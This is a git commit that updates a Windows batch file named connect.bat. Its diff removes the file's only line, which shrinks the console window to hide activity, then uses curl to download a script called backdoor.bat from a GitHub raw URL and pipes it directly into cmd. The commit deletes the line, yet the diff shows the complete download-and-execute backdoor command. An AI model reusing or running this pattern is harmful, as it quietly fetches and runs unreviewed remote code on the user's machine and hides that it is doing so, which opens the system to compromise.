2cdb877464229302eb2634f5a2dfb3d377a67f8b
snowyxxdev <snowyware@gmail.com>
2024-10-06 12:04:22 +0100

    Update connect.bat

--- connect.bat
+++ connect.bat
@@ -1,1 +1,1 @@
-mode con: cols=20 lines=1 && cls && @echo off && cls && start cmd /c "mode con: cols=20 lines=1  && curl -s https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/backdoor.bat | cmd && exit" && cls
+
